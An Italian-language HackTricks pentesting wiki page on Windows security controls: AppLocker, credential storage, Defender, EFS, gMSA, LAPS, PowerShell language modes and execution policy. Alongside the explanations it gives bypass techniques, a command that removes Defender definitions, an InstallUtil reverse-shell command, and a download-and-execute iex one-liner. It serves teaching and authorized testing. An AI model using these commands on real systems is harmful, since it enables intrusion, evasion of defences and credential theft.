# Controlli di Sicurezza di Windows

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti comunitari più avanzati** al mondo.\
Accedi Oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Politica di AppLocker

Una whitelist di applicazioni è un elenco di applicazioni software o eseguibili approvati che possono essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannoso e software non approvato che non si allinea con le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di whitelisting delle applicazioni** di Microsoft e offre agli amministratori di sistema il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce un **controllo granulare** su eseguibili, script, file di installazione di Windows, DLL, app confezionate e installatori di app confezionate.\
È comune per le organizzazioni **bloccare cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere aggirato**.

### Controllo

Controlla quali file/estensioni sono nella blacklist/whitelist:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Questo percorso del registro contiene le configurazioni e le politiche applicate da AppLocker, fornendo un modo per rivedere l'attuale insieme di regole applicate sul sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Cartelle scrivibili** utili per bypassare la politica di AppLocker: Se AppLocker consente di eseguire qualsiasi cosa all'interno di `C:\Windows\System32` o `C:\Windows`, ci sono **cartelle scrivibili** che puoi utilizzare per **bypassare questo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I comuni **binaries** [**"LOLBAS's"**](https://lolbas-project.github.io/) possono essere utili per bypassare AppLocker.
- **Regole scritte male possono essere bypassate**
- Ad esempio, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e sarà consentita.
- Le organizzazioni spesso si concentrano sul **bloccare l'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano le **altre** [**posizioni eseguibili di PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **L'applicazione delle DLL è molto raramente abilitata** a causa del carico aggiuntivo che può mettere su un sistema e della quantità di test necessari per garantire che nulla si rompa. Quindi utilizzare **DLL come backdoor aiuterà a bypassare AppLocker**.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per ulteriori informazioni controlla: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Archiviazione delle Credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file, le password sono hashate.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (hashate) sono **salvate** nella **memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **politica di sicurezza** locale (politica delle password, permessi degli utenti...), **autenticazione**, **token di accesso**...\
LSA sarà colui che **verificherà** le credenziali fornite all'interno del file **SAM** (per un accesso locale) e **parlerà** con il **controller di dominio** per autenticare un utente di dominio.

Le **credenziali** sono **salvate** all'interno del **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittabili.

### Segreti LSA

LSA potrebbe salvare su disco alcune credenziali:

- Password dell'account computer dell'Active Directory (controller di dominio irraggiungibile).
- Password degli account dei servizi Windows
- Password per attività pianificate
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database dell'Active Directory. È presente solo nei Controller di Dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un Antivirus disponibile in Windows 10 e Windows 11, e nelle versioni di Windows Server. **Blocca** strumenti comuni di pentesting come **`WinPEAS`**. Tuttavia, ci sono modi per **bypassare queste protezioni**.

### Controllo

Per controllare lo **stato** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo potresti anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protegge i file attraverso la crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave è crittografata con la **chiave pubblica** dell'utente e memorizzata all'interno del $EFS **flusso di dati alternativi** del file crittografato. Quando è necessaria la decrittazione, viene utilizzata la corrispondente **chiave privata** del certificato digitale dell'utente per decrittografare la FEK dal flusso $EFS. Maggiori dettagli possono essere trovati [qui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenari di decrittazione senza iniziativa dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system non-EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono automaticamente decrittografati.
- I file crittografati inviati attraverso la rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente un **accesso trasparente** ai file crittografati per il proprietario. Tuttavia, semplicemente cambiando la password del proprietario e accedendo non sarà possibile la decrittazione.

**Punti chiave**:

- EFS utilizza una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- La decrittazione impiega la chiave privata dell'utente per accedere alla FEK.
- La decrittazione automatica avviene in determinate condizioni, come la copia su FAT32 o la trasmissione in rete.
- I file crittografati sono accessibili al proprietario senza passaggi aggiuntivi.

### Controlla le informazioni EFS

Controlla se un **utente** ha **utilizzato** questo **servizio** verificando se esiste questo percorso:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Controlla **chi** ha **accesso** al file usando cipher /c \<file>\
Puoi anche usare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittazione dei file EFS

#### Essere Authority System

Questo metodo richiede che l'**utente vittima** stia **eseguendo** un **processo** all'interno dell'host. Se è così, utilizzando una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). Oppure potresti semplicemente `migrate` al processo dell'utente.

#### Conoscere la password dell'utente

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali che spesso hanno l'impostazione "**Password never expire**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: i gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base alla politica del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali delle password.
- **Sicurezza migliorata**: questi account sono immuni ai blocchi e non possono essere utilizzati per accessi interattivi, migliorando la loro sicurezza.
- **Supporto per più host**: i gMSA possono essere condivisi tra più host, rendendoli ideali per servizi in esecuzione su più server.
- **Capacità di attività pianificate**: a differenza degli account di servizio gestiti, i gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando ci sono modifiche ai dettagli sAMaccount del computer o al nome DNS, semplificando la gestione degli SPN.

Le password per i gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono automaticamente reimpostate ogni 30 giorni dai Domain Controllers (DC). Questa password, un blob di dati crittografato noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo da amministratori autorizzati e dai server su cui sono installati i gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni, è necessaria una connessione sicura come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trova ulteriori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Inoltre, controlla questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) su come eseguire un **attacco di relay NTLM** per **leggere** la **password** di **gMSA**.

## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente la gestione delle password degli amministratori locali. Queste password, che sono **randomizzate**, uniche e **cambiate regolarmente**, sono memorizzate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACL a utenti autorizzati. Con permessi sufficienti concessi, è fornita la possibilità di leggere le password degli amministratori locali.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blocca molte delle funzionalità** necessarie per utilizzare PowerShell in modo efficace, come il blocco degli oggetti COM, consentendo solo tipi .NET approvati, flussi di lavoro basati su XAML, classi PowerShell e altro ancora.

### **Controlla**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```powershell
#Easy bypass
Powershell -version 2
```
In Windows attuale, quel bypass non funzionerà, ma puoi usare [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti aver bisogno** **di** _**Aggiungere un Riferimento**_ -> _Sfoglia_ -> _Sfoglia_ -> aggiungi `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **cambiare il progetto a .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per ulteriori informazioni controlla: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politica di Esecuzione PS

Per impostazione predefinita è impostata su **riservata.** I principali modi per bypassare questa politica:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

È l'API che può essere utilizzata per autenticare gli utenti.

L'SSPI sarà responsabile della ricerca del protocollo adeguato per due macchine che desiderano comunicare. Il metodo preferito per questo è Kerberos. Poi l'SSPI negozierà quale protocollo di autenticazione verrà utilizzato, questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL e entrambe le macchine devono supportare lo stesso per poter comunicare.

### Main SSPs

- **Kerberos**: Il preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Server web e LDAP, password sotto forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Viene utilizzato per negoziare il protocollo da utilizzare (Kerberos o NTLM, con Kerberos come predefinito)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi o solo uno.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **messaggio di consenso per attività elevate**.

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

---

{{#include ../banners/hacktricks-training.md}}
